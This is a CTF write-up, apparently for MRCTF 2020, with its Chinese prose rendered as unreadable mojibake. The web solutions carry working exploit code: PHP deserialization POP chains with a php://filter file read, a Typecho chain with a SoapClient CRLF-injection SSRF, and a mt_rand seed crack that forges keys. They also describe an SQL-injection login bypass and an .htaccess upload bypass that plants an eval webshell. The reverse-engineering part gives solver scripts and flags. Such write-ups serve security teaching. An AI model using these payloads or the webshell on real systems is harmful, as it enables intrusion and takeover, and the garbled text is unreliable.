ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•123456789__construct()//å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨__destruct() //å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨__toString() //å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨__sleep()//åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ__wakeup()//å°†åœ¨ååºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨(é€šè¿‡åºåˆ—åŒ–å¯¹è±¡å…ƒç´ ä¸ªæ•°ä¸ç¬¦æ¥ç»•è¿‡)__get()//è·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨__set()//è®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨__invoke()//è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•__call()//å½“è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸­çš„ä¸èƒ½ç”¨çš„æ–¹æ³•çš„æ—¶å€™å°±ä¼šæ‰§è¡Œè¿™ä¸ªå‡½æ•° publicã€protectedä¸privateåœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«protected å£°æ˜çš„å­—æ®µä¸ºä¿æŠ¤å­—æ®µï¼Œåœ¨æ‰€å£°æ˜çš„ç±»å’Œè¯¥ç±»çš„å­ç±»ä¸­å¯è§ï¼Œä½†åœ¨è¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­ä¸å¯è§ã€‚å› æ­¤ä¿æŠ¤å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œå­—æ®µåå‰é¢ä¼šåŠ ä¸Š\\0\\0çš„å‰ç¼€ã€‚è¿™é‡Œçš„ \\0 è¡¨ç¤º ASCII ç ä¸º 0 çš„å­—ç¬¦(ä¸å¯è§å­—ç¬¦)ï¼Œè€Œä¸æ˜¯ \\0 ç»„åˆã€‚è¿™ä¹Ÿè®¸è§£é‡Šäº†ï¼Œä¸ºä»€ä¹ˆå¦‚æœç›´æ¥åœ¨ç½‘å€ä¸Šï¼Œä¼ é€’\\0\\0usernameä¼šæŠ¥é”™ï¼Œå› ä¸ºå®é™…ä¸Šå¹¶ä¸æ˜¯\\0ï¼Œåªæ˜¯ç”¨å®ƒæ¥ä»£æ›¿ASCIIå€¼ä¸º0çš„å­—ç¬¦ã€‚å¿…é¡»ç”¨pythonä¼ å€¼æ‰å¯ä»¥ã€‚ BASE64 Wrapper LFIphp://filter/convert.base64-encode/resource=flag.php Exp: 123456789101112131415161718192021222324252627&lt;?php class Show{ public $source; public $str;}class Test{ public $p;}class Modifier{ protected $var; function __construct(){ $this-&gt;var=\"php://filter/convert.base64-encode/resource=flag.php\"; }}$s = new Show();$t = new Test();$r = new Modifier();$t-&gt;p = $r;$s-&gt;str = $t;$s-&gt;source = $s;var_dump(urlencode(serialize($s)));?&gt; åˆ†æï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier { protected $var; public function append($value){ include($value);//8.è§¦å‘è¿™ä¸ªincludeï¼Œåˆ©ç”¨php base64 wrapper è¯»flag } public function __invoke(){ $this-&gt;append($this-&gt;var);//7.ç„¶åä¼šè°ƒç”¨åˆ°è¿™é‡Œ }}class Show{ public $source; public $str; public function __construct($file='index.php'){ $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\"; } public function __toString(){ return $this-&gt;str-&gt;source;//4.è¿™é‡Œä¼šè°ƒç”¨str-&gt;sourceçš„__get é‚£ä¹ˆæˆ‘ä»¬å°†å…¶è®¾ç½®ä¸ºTestå¯¹è±¡ } public function __wakeup(){//2.å¦‚æœpopæ˜¯ä¸ªShow,é‚£ä¹ˆè°ƒç”¨è¿™é‡Œ if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) {//3.åŒ¹é…çš„æ—¶å€™ä¼šè°ƒç”¨__toString echo \"hacker\"; $this-&gt;source = \"index.php\"; } }}class Test{ public $p; public function __construct(){ $this-&gt;p = array(); } public function __get($key){ $function = $this-&gt;p;//5.è§¦å‘åˆ°è¿™é‡Œ return $function();//6.()ä¼šè°ƒç”¨__invoke,æˆ‘ä»¬è¿™é‡Œé€‰æ‹©Modifierå¯¹è±¡ }}if(isset($_GET['pop'])){ @unserialize($_GET['pop']);//1.ååºåˆ—è°ƒç”¨è¿™é‡Œ}else{ $a=new Show; highlight_file(__FILE__);} æ„é€ å³å¯ å¥—å¨ƒåœ¨URLä¸­GETè¯·æ±‚å½“è¾“å…¥.æˆ–è€…(ç©ºæ ¼)æˆ–è€…_éƒ½ä¼šå¿½ç•¥ï¼Œå› æ­¤b_u_p_t,å…¶å®å°±æ˜¯b u p t,æ­£åˆ™çš„æ„æ€æ˜¯å¿…é¡»è¦23333å¼€å¤´å’Œç»“å°¾ï¼Œä½†æ˜¯å€¼ä¸èƒ½ä¸º23333ï¼Œè¿™ä¸ªæ—¶å€™urlçš„%0Aä¸ºæ¢è¡Œæ±¡æŸ“ï¼Œå¯ä»¥ç»•è¿‡æ­£åˆ™ï¼Œä¸”å€¼ä¸ä¸º23333ã€‚ç›´æ¥è¿›å…¥ä¸‹ä¸€ä¸ªå¥—å¨ƒã€‚jsfuckåœ¨æ§åˆ¶å™¨è¾“å‡ºå‘ç°POST Merakã€‚Post Merak=1å³å¯æŸ¥çœ‹æºç ã€‚åˆ¤æ–­æ„å›¾æ˜¯æ¨¡æ‹Ÿæœ¬åœ°ç”¨æˆ·ï¼Œè¿™é‡Œæˆ‘ç¦äº†XFFå¤´ï¼Œå¯ä»¥ç”¨Client-ipè¿›è¡Œç»•è¿‡å³å¯ï¼Œæœ€åfile_get_contentséœ€è¦è§£å¯†ï¼Œexpå¦‚ä¸‹ 12345678910111213141516171819&lt;?phpfunction decode($v){ $v = base64_decode($v); $re = ''; for($i=0;$i&lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; } function en_code($value){ $result = ''; for($i=0;$i&lt;strlen($value);$i++){ $result .= chr(ord($value[$i]) - $i*2); } $result = base64_encode($result); return $result;}echo en_code(\"flag.php\");?&gt; Ezauditindexé¡µé¢æ˜¯ä¸€ä¸ªå•¥ä¹Ÿæ²¡ç”¨çš„é¡µé¢ï¼Œéœ€è¦æ‰«åå°ï¼Œå‘ç°å­˜åœ¨login.phpä¸ºç©ºï¼Œè€ƒè™‘åˆ°å¯èƒ½æ˜¯å¤„ç†åç«¯,å‰ç«¯åˆ™æ˜¯login.html,å‘ç°æ˜¯ä¸€ä¸ªç®€å•çš„ç™»å½•æ¡†ï¼Œåªæœ‰ç™»å½•æ¡†æƒ³åˆ°å¤§æ¦‚ç‡å­˜åœ¨æºç æ³„éœ²ï¼Œå‘ç°www.zipæ–‡ä»¶ï¼Œåˆ¤æ–­ç™»å½•é€»è¾‘æ˜¯sqlæŸ¥è¯¢ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå¯ä»¥ç›´æ¥ä¸‡èƒ½å¯†ç ï¼Œè¿˜éœ€è¦è¾“å…¥å¯†é’¥ï¼Œè¿™é‡Œäº§ç”Ÿå…¬é’¥å’Œç§˜é’¥çš„æœºåˆ¶éƒ½æ˜¯ä½¿ç”¨mt_randï¼Œè€Œè¿™æ˜¯ä¸ªä¼ªéšæœºæ•°ï¼Œå¯ä»¥è¿›è¡Œç ´è§£ï¼ŒçŸ¥é“å…¬é’¥åå°†å…¬é’¥è½¬åŒ–æˆphp_mt_seedæ ¼å¼ï¼Œgayhubç›´æ¥git cloneï¼Œå¾—åˆ°ç§å­åï¼Œå†å°†å…¶ç”Ÿæˆ12ä½å¯†é’¥å³å¯ï¼Œå…·ä½“åŸç†:https://blog.csdn.net/crisprx/article/details/104306971exp: 123456789101112131415161718192021222324252627282930313233343536&lt;?php$str = \"KVQP0LdJKRaV3n9D\";$randStr = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"; for($i=0;$i&lt;strlen($str);$i++){ $pos = strpos($randStr,$str[$i]); echo $pos.\" \".$pos.\" \".\"0 \".(strlen($randStr)-1).\" \"; //æ•´ç†æˆæ–¹ä¾¿ php_mt_seed æµ‹è¯•çš„æ ¼å¼ //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]}echo \"\\n\";/** *çˆ†ç ´å¾—åˆ°mt_srand = 1775196155 */mt_srand(1775196155);function public_key($length = 16) { $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $public_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key;}/** * å…ˆç”Ÿæˆä¸€æ¬¡å…¬é’¥åœ¨ç”Ÿæˆä¸€æ¬¡å¯†é’¥ XuNhoueCDCGc */function private_key($length = 12) { $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $private_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key;}echo public_key();echo \"\\n\";echo private_key();?&gt; ä½ ä¼ ä½ ğŸå‘¢å¾ˆç»å…¸çš„ä¸Šä¼ ç»•è¿‡ï¼Œä¸»è¦è€ƒå¯Ÿä¸€ä¸‹åŸºæœ¬çš„ä¸Šä¼ ç»•è¿‡æŠ€èƒ½ åˆ©ç”¨BurpSuiteä¿®æ”¹MIMEæ¬ºéª—åç«¯æ–‡ä»¶ç±»å‹ä¿®æ”¹Content-Type: image/pngç„¶åå°±å¯ä»¥ä¼ ä»»æ„æ–‡ä»¶åç¼€åˆ©ç”¨.htaccessæ¥åˆ¶ä½œå›¾ç‰‡é©¬ å¢åŠ ä½¿ç”¨phpè§£æçš„æ–‡ä»¶åç¼€(.jpg) AddType application/x-httpd-php .jpg ç„¶åå†å†™ä¸ªä¸€å¥è¯ 1&lt;?php eval($_REQUEST['eki']);?&gt; ç”¨èšå‰‘è¿ä¸Šå°±å¯ä»¥äº† Ezpop Revengeä¸»è¦è€ƒå¯ŸCMSå®¡è®¡èƒ½åŠ›å’ŒSSRFçš„åº”ç”¨é¡ºç€Typechoçš„æºç æçš„ä»Githubä¸Šå…‹éš†æºç ï¼Œå‘ç°1.2é¢„è§ˆç‰ˆè¿˜æœ‰1.1çš„POPé“¾æ”¹é€ äº†ä¸€ä¸‹å…¥å£,ç„¶åå¥—äº†SoapClientæ¥SSRF å…¥å£ç‚¹ 12345678910111213141516//HelloWorld/Plugin.phpif (isset($_POST['C0incid3nc3'])) { if(preg_match(\"/file|assert|eval|op|sy|exec|dl|ini|pass|scan|log|[`\\'~^?&lt;&gt;$%]+/i\",base64_decode($_POST['C0incid3nc3'])) === 0) unserialize(base64_decode($_POST['C0incid3nc3'])); else { echo \"Not that easy.\"; } //call_user_func(\"call_user_func\",array($a,\"233\")); }class HelloWorld_DB{ private $flag=\"MRCTF{this_is_a_fake_flag}\"; private $coincidence; function __wakeup(){ $db = new Typecho_Db($this-&gt;coincidence['hello'], $this-&gt;coincidence['world']); }} è·¯ç”±ç‚¹ 12//Typecho/Plugin.php Helper::addRoute(\"page_admin_action\",\"/page_admin\",\"HelloWorld_Plugin\",'action'); Popé“¾å¯ä»¥å‚ç…§Exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpclass HelloWorld_DB{ private $flag=\"MRCTF{this_is_a_fake_flag}\"; private $coincidence; function __construct($coincidence){ $this-&gt;coincidence = $coincidence; } function __wakeup(){ $db = new Typecho_Db($this-&gt;coincidence['hello'], $this-&gt;coincidence['world']); }}class Typecho_Request{ private $_params; private $_filter; function __construct($params,$filter){ $this-&gt;_params=$params; $this-&gt;_filter=$filter; }}class Typecho_Feed{ private $_type = 'ATOM 1.0'; private $_charset = 'UTF-8'; private $_lang = 'zh'; private $_items = array(); public function addItem(array $item){ $this-&gt;_items[] = $item; }}$target = \"http://127.0.0.1/flag.php\";$post_string = '';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=m6o9n632iub7u2vdv0pepcrbj2');$a = new SoapClient(null,array('location' =&gt; $target, 'user_agent'=&gt;\"eki\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\".join(\"\\r\\n\",$headers).\"\\r\\nContent-Length: \".(string)strlen($post_string).\"\\r\\n\\r\\n\".$post_string, 'uri' =&gt; \"aaab\"));$payload1 = new Typecho_Request(array('screenName'=&gt;array($a,\"233\")),array('call_user_func'));$payload2 = new Typecho_Feed();$payload2-&gt;addItem(array('author' =&gt; $payload1));$exp1 = array('hello' =&gt; $payload2, 'world' =&gt; 'typecho');$exp = new HelloWorld_DB($exp1);echo serialize($exp).\"\\n\";echo urlencode(base64_encode(serialize($exp))); å¯ä»¥åˆ†æå†…ç½‘åœ°å€ 123456&lt;?phpif(!isset($_SESSION)) session_start();if($_SERVER['REMOTE_ADDR']===\"127.0.0.1\"){ $_SESSION['flag']= \"MRCTF{Cr4zy_P0p_4nd_RCE}\";}else echo \"æˆ‘æ‰Œyour problem?\\nonly localhost can get flag!\";?&gt; è¿™ä¹Ÿæ˜¯ä¸ºå•¥cookieè¦å¸¦session ç”¨payloadæ‰“ä¸€æ¬¡åˆ·æ–°ä¸‹é¡µé¢var_dump()å°±ä¼šdumpflagå‡ºæ¥äº† Not So Web Applicationé¦–å…ˆæ˜¯é¢˜ç›®è¯´æ˜ï¼Œè¿™ç©æ„æœ¬æ¥æ²¡è¿™ä¹ˆæ¶å¿ƒï¼ˆæ²¡ä¼ªè£…åŠ ä¸Š User å’Œ SQL é‚£ä¸ª SVGï¼‰æœ¬é¢˜ä¸»è¦éš¾ç‚¹åœ¨äº Web Assembly è‡³ä»Šæ²¡æœ‰ä¸ªèƒ½ç”¨çš„è°ƒè¯•å™¨ï¼Œæ‰€ä»¥éœ€è¦å¤šç§æ‰‹æ®µåŠ¨è°ƒ+é™æ€è°ƒè¯•ã€‚å¯ä»¥å…ˆé€šè¿‡å’Œå…¶ä»– Qt for Web Assembly ç¨‹åºæ¯”å¯¹ï¼Œå»æ‰ä¸€å¤§åŠç–‘ä¼¼å‡½æ•°ï¼ŒåŒæ—¶å¯ä»¥é€šè¿‡æœç´¢å­—ç¬¦ä¸²ï¼ˆIncorrectç­‰ï¼‰ç¡®å®šå¤§æ¦‚ç›¸å…³å‡½æ•°ä½ç½®ã€‚åŒæ—¶é€šè¿‡ç»™è¾“å…¥æ¡†å¡å…¥å¤§é‡åƒåœ¾ï¼ˆ&gt;64KBï¼ŒwasmåŸºæœ¬å†…å­˜å•ä½ï¼‰è§¦å‘å†…å­˜è¶Šç•Œé”™è¯¯æ‰¾åˆ°å˜é‡å­˜å‚¨ä½ç½®ã€‚æœ€ç»ˆåœ¨æµè§ˆå™¨é‡ŒåŠ¨è°ƒå’Œ wasm2c çš„è¾…åŠ©å¯ä»¥æ‰¾åˆ°flagåŠ å¯†åå†…å®¹å’Œæ¯”å¯¹ç®—æ³•ã€‚ REXor(æ ¡å†…ä¸“ä¾›)å¼‚æˆ–ä¸€æ¬¡åçš„æ•°æ®å†å¼‚æˆ–ä¸€æ¬¡å³å¯å¾—åˆ°åŸæ•°æ®å°†è¾“å…¥å­—ç¬¦å’Œåºå·è¿›è¡Œå¼‚æˆ–ï¼Œå†ä¸ç›®æ ‡æ•°ç»„æ¯”è¾ƒæ‰€ä»¥åªéœ€è¦å°†ç›®æ ‡æ•°ç»„åè¿‡æ¥å†æ¬¡å¼‚æˆ–å°±å¯ä»¥å¾—åˆ°flag 1234567891011121314#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;cstdlib&gt;char flag[100]={0x4D,0x53,0x41,0x57,0x42,0x7E,0x46,0x58,0x5A,0x3A,0x4A,0x3A,0x60,0x74,0x51,0x4A,0x22,0x4E,0x40,0x20,0x62,0x70,0x64,0x64,0x7D,0x38,0x67};int main(){ for(int i=0;i&lt;strlen(flag);i++) { unsigned char tmp=flag[i]; tmp^=i; printf(\"%c\",tmp); } return 0;} å¾—åˆ°flag:MRCTF{@_R3@1ly_E2_R3verse!} Transformå…¶å®å°±æ˜¯ä¸ªç®€å•çš„å­—ç¬¦ç½®æ¢ï¼Œå¯ä»¥è¯•è¯•è¾“å…¥æœ‰è§„å¾‹çš„å­—ç¬¦ä¸²ï¼Œç„¶ådumpå‡ºå¤„ç†è¿‡åçš„å­—ç¬¦ä¸²è¿™æ ·å°±çŸ¥é“ç½®æ¢çŸ©é˜µäº†ï¼Œæ‹¿å‡ºæ•°æ®ç½®æ¢ä¸€ä¸‹ï¼Œå¼‚æˆ–ä¸€ä¸‹å°±æ˜¯flagã€‚ã€‚ æ’¸å•Šæ’¸è¿™é“é¢˜ç›®å…¶å®é¢˜ç›®åæœ‰å¾ˆå¤§çš„æç¤ºï¼Œlua luè¿™ä¸ªä½¿ç”¨C++å†…åµŒluaå†™çš„ï¼Œä¸ç„¶ä¸ºä»€ä¹ˆä¼šæ˜¾ç¤ºâ€I need My friend to help me check your flag!â€åªéœ€è¦æ ¹æ®åˆ¤æ–­é€»è¾‘é€†å‘æ€è€ƒï¼Œå¯ä»¥çœ‹å‡ºsub_7FF650AFD980æ˜¯ä¸ªå¾ˆé‡è¦çš„å‡½æ•°ç„¶åè§‚å¯Ÿå®ƒçš„å‚æ•°ï¼Œå‘ç°å‡ºå…¥äº†ä¸€ä¸ªä¹±ä¸ƒå…«ç³Ÿçš„å­—ç¬¦ä¸²ã€‚çœ‹ä¸å‡ºæ¥æ˜¯å•¥ï¼Œä½†æ˜¯å¦‚æœåŠ¨è°ƒï¼Œå°±ä¼šå‘ç°è¿™ä¸ªå­—ç¬¦ä¸²è¢«ä¿®æ”¹äº†ï¼Œçœ‹çš„æ‡‚äº† 12345678910111213141516171819202122cmps={83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97}print(\"Give Me Your Flag LOL!:\")flag=io.read()if string.len(flag)~=29 then print(\"Wrong flag!\") os.exit()endfor i=1,string.len(flag) do local x=string.byte(flag,i) if i%2==0 then x=x~i else x=x+6 end if x~=cmps[i] then print(\"Wrong flag!\") os.exit() end endprint(\"Right flag!\")os.exit() è¿™é‡Œçš„~æ˜¯å¼‚æˆ–çš„æ„æ€ï¼Œå°±å¾ˆå®¹æ˜“çœ‹æ‡‚äº†EXP 12345678910a=[83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97]flag=\"\"for i in range(1,29): x=a[i-1] if i%2==0: x^=i else: x-=6 flag+=chr(x)print flag PixelShooterè¿™é“é¢˜ç›®ä½¿ç”¨äº†Unityå†™çš„ä¸ªå°æ¸¸æˆè¡¨é¢ä¸Šæ˜¯apkï¼Œå…¶å®æ˜¯ä¸ªC#é€†å‘å¤§éƒ¨åˆ†çš„Unityéƒ½æ˜¯ç”¨C#å†™çš„ï¼Œå…¶ä¸­æœ‰ä¸ªå­˜å‚¨é€»è¾‘ä»£ç çš„C#äºŒè¿›åˆ¶æ–‡ä»¶Assembly-Csharp.dllæ‰€ä»¥åªè¦æ‰¾åˆ°è¿™ä¸ªç©æ„å°±æ˜¯äº†apkè§£åŒ…ï¼ŒPixelShooter.apk\\assets\\bin\\Data\\Managedä¸‹é¢å°±æ˜¯äº†dnspyæ‰“å¼€å³å¯åœ¨UIControllerä¸‹æ‰¾åˆ°flagMRCTF{Unity_1S_Fun_233} Junkè¿™é“é¢˜å¦‚åŒå…¶åå­—ï¼ŒJunkå¾€é‡Œé¢å¡äº†å¾ˆå¤šJunkCodeï¼Œåªè¦ä¸€ä¸ªä¸ªå»æ‰å°±æ˜¯äº†ï¼ŒUå’ŒCé”®äº¤æ›¿(é‡Œé¢æ’äº†è®¸å¤š0xE8å­—èŠ‚æ¥è¿·æƒ‘IDA)é¡ºä¾¿æŠŠä¸€äº›ç¨€é‡Œç³Šæ¶‚çš„Callç»™åˆ äº†(é€šè¿‡Callä¸€ä¸ªå‡½æ•°ï¼Œå‡½æ•°é‡Œä¿®æ”¹äº†EIPçš„å€¼ï¼Œè¿›è¡Œè·³è½¬ï¼Œè¿™ä¼šå¯¼è‡´F5åˆ†æå¤±è´¥)å¯ä»¥ä»”ç»†åˆ†æä¸€ä¸‹ï¼Œè¿™é‡Œå¯¹è¾“å…¥è¿›è¡Œäº†å¼‚æˆ–ç„¶åå®ç°äº†å¾ªç¯å·¦ç§»å’Œå³ç§»çš„æ“ä½œï¼Œé‰´äºä½ç§»å››ä½ï¼Œå…¶å®å·¦ç§»å³ç§»éƒ½æ˜¯ä¸€æ ·çš„è¿™é‡Œè¿˜æœ‰ä¸ªå¥‡æ€ªçš„å‡½æ•°sub_B81090ï¼Œå¯¹æ•°æ®è¿›è¡Œäº†å¥‡æ€ªçš„æ“ä½œç‚¹å¼€çœ‹çœ‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697char __fastcall sub_B81090(char *a1, int a2){ int v2; // eax signed int v3; // esi int v4; // edi char v5; // al unsigned __int8 v6; // ah unsigned __int8 v7; // dh unsigned __int8 v8; // bh unsigned __int8 v9; // dl signed int v10; // eax bool v11; // cf unsigned __int8 v12; // cl int i; // ecx int v15; // [esp+8h] [ebp-14h] char v16; // [esp+10h] [ebp-Ch] char v17; // [esp+11h] [ebp-Bh] char v18; // [esp+12h] [ebp-Ah] char v19; // [esp+13h] [ebp-9h] unsigned __int8 v20; // [esp+14h] [ebp-8h] unsigned __int8 v21; // [esp+15h] [ebp-7h] unsigned __int8 v22; // [esp+16h] [ebp-6h] unsigned __int8 v23; // [esp+1Bh] [ebp-1h] v2 = a2; v3 = 0; v4 = 0; if ( a2 ) { do { v15 = v2 - 1; v5 = *a1++; *(&amp;v20 + v3++) = v5; v6 = v22; v7 = v21; v8 = v20; v23 = v22; if ( v3 == 3 ) { v9 = (v22 &gt;&gt; 6) + 4 * (v21 &amp; 0xF); v17 = (v21 &gt;&gt; 4) + 16 * (v20 &amp; 3); v18 = (v22 &gt;&gt; 6) + 4 * (v21 &amp; 0xF); v19 = v22 &amp; 0x3F; v16 = v20 &gt;&gt; 2; byte_BA1708[v4] = byte_B9EA00[v20 &gt;&gt; 2]; byte_BA1709[v4] = byte_B9EA00[(unsigned __int8)((v7 &gt;&gt; 4) + 16 * (v8 &amp; 3))]; byte_BA170A[v4] = byte_B9EA00[v9]; byte_BA170B[v4] = byte_B9EA00[v6 &amp; 0x3F]; v4 += 4; v3 = 0; } v2 = v15; } while ( v15 ); if ( v3 ) { v10 = v3; if ( v3 &gt;= 3 ) { v12 = v23; } else { v11 = (unsigned int)v3 &lt; 3; do { if ( !v11 ) { sub_B8150A(a1); JUMPOUT(*(_DWORD *)algn_B811F3); } *(&amp;v20 + v10++) = 0; v11 = (unsigned int)v10 &lt; 3; } while ( v10 &lt; 3 ); v12 = v22; v7 = v21; v8 = v20; } v16 = v8 &gt;&gt; 2; v17 = (v7 &gt;&gt; 4) + 16 * (v8 &amp; 3); LOBYTE(v2) = v12 &gt;&gt; 6; v19 = v12 &amp; 0x3F; v18 = (v12 &gt;&gt; 6) + 4 * (v7 &amp; 0xF); for ( i = 0; i &lt; v3 + 1; ++v4 ) { v2 = (unsigned __int8)*(&amp;v16 + i++); LOBYTE(v2) = byte_B9EA00[v2]; byte_BA1708[v4] = v2; } if ( v3 &lt; 3 ) LOBYTE(v2) = sub_B822E0(&amp;byte_BA1708[v4], 46, 3 - v3); } } return v2;} ä¸éš¾å‘ç°å°±æ˜¯ä¸ªbase64å˜ç§ï¼Œä¸è¿‡å°±æ˜¯æŠŠè¡¨æ¢äº†ä¸€ä¸‹ï¼Œç­‰äºå·æ¢æˆç‚¹è€Œå·²ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^&amp;*(+/æœ€ååœ¨å’Œå·²æœ‰å­—ç¬¦ä¸²æ¯”è¾ƒæ‰€ä»¥æ€è·¯å¾ˆç®€å•: è§£å˜ç§base64-&gt;å¾ªç¯å·¦ç§»4ä½-&gt;å¼‚æˆ–3-&gt;å¾—åˆ°flagEXP 123456789101112131415161718192021import base64orig=\"%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(aGBsZ@ZpZn!oYGxnZm%w..\"orig=orig.replace(')','0')orig=orig.replace('!','1')orig=orig.replace('@','2')orig=orig.replace('#','3')orig=orig.replace('$','4')orig=orig.replace('%','5')orig=orig.replace('^','6')orig=orig.replace('&amp;','7')orig=orig.replace('*','8')orig=orig.replace('(','9')orig=orig.replace('.','=')print origcode=base64.b64decode(orig).encode('hex')flag=\"\"for x in range(0,len(code),2): num=int(code[x:x+2],16) num=(((num&gt;&gt;4)&amp;0xff) | ((num&lt;&lt;4)&amp;0xff)) flag+=chr(num^3)print flag MRCTF{junkjunkjunkcodejunkjunkcodejunkcode} EasyCPPç¨‹åºè¿ç”¨äº†è¾ƒå¤šçš„C++ç‰¹æ€§æ‰€ä»¥ä»£ç çœ‹èµ·æ¥ä¼šæ¯”è¾ƒå†—æ‚ï¼Œå¥½åœ¨ç»™äº†ç¬¦å·æ€»ä½“ä¸Šæ˜¯è¦è¾“å…¥9ä¸ªæ•°å­—ï¼Œå¹¶å­˜å…¥äº†Vectorç„¶åé€šè¿‡lambdaè¡¨è¾¾å¼è¿›è¡Œäº†æ¯ä¸ªæ•°å­—å¼‚æˆ–1çš„æ“ä½œï¼Œç„¶åå¯¹ç»“æœè°ƒç”¨äº†ä¸ªdepartçš„å‡½æ•°å¾—åˆ°ä¸€ä¸ªstringçš„ç»“æœï¼Œæœ€åå’ŒåŸæœ‰çš„9ä¸ªå¥‡æ€ªå­—ç¬¦ä¸²æ¯”è¾ƒæœ€åè¾“å‡ºä¹ä¸ªæ•°å­—æ‹¼èµ·æ¥çš„å­—ç¬¦ä¸²ï¼Œflagå°±æ˜¯è¦æŠŠè¿™ä¹ä¸ªæ•°å­—æ‹¼èµ·æ¥è¿›è¡Œmd5æ ¡éªŒååŒ…èµ·æ¥ ç„¶åæ¥åˆ†æä¸‹departå‡½æ•°å’Œé‚£ä¸ªè´Ÿè´£æ›¿æ¢çš„lambdaè¡¨è¾¾å¼ 1234567891011121314151617181920212223242526__int64 __fastcall depart(int a1, __int64 a2, double a3){ char v4; // [rsp+20h] [rbp-60h] char v5; // [rsp+40h] [rbp-40h] int i; // [rsp+68h] [rbp-18h] int v7; // [rsp+6Ch] [rbp-14h] v7 = a1; for ( i = 2; ; ++i ) { std::sqrt&lt;int&gt;((unsigned int)a1); //æšä¸¾åˆ°æ ¹å·n if ( a3 &lt; (double)i ) break; if ( !(a1 % i) ) //èƒ½åˆ†è§£å°±åˆ†è§£ { v7 = i; depart((unsigned int)(a1 / i), a2); //é€’å½’åˆ†è§£ break; } } std::__cxx11::to_string((std::__cxx11 *)&amp;v5, v7); //å°†æ•°å­—è½¬ä¸ºå­—ç¬¦ä¸²ä»¥ç©ºæ ¼ä¸ºé—´éš”ç¬¦åˆå¹¶èµ·æ¥ std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v4, &amp;unk_500C, &amp;v5); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(a2, &amp;v4); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v4); return std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v5);} æœ€åé‚£ä¸ªæ¯”è¾ƒå‡½æ•°å…¶å®å°±æ˜¯ 1234567891011replace(a.begin(),a.end(),'0','O');replace(a.begin(),a.end(),'1','l');replace(a.begin(),a.end(),'2','z');replace(a.begin(),a.end(),'3','E');replace(a.begin(),a.end(),'4','A');replace(a.begin(),a.end(),'5','s');replace(a.begin(),a.end(),'6','G');replace(a.begin(),a.end(),'7','T');replace(a.begin(),a.end(),'8','B');replace(a.begin(),a.end(),'9','q');replace(a.begin(),a.end(),' ','='); å°†è¿™äº›ä¸œè¥¿æ›¿æ¢å›æ•°å­—ï¼Œå†æŠŠè¿™äº›æ•°å­—ä¹˜èµ·æ¥ï¼Œå†å¼‚æˆ–1ä¸€ä¸‹å°±æ˜¯è¾“å…¥çš„ä¹ä¸ªæ•°å­— 12345678910234512225774247633749032245635316720MRCTF{4367FB5F42C6E46B2AF79BF409FB84D3} 